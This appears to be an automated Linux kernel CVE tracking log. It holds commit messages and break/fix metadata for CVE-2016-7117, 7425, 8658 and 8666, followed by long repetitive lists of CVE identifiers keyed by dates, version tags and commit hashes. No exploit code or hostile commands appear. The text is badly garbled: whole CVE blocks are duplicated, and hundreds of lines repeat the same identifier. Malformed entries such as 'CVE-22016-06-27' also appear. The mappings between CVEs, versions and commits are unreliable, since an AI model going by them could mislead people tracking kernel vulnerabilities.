    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
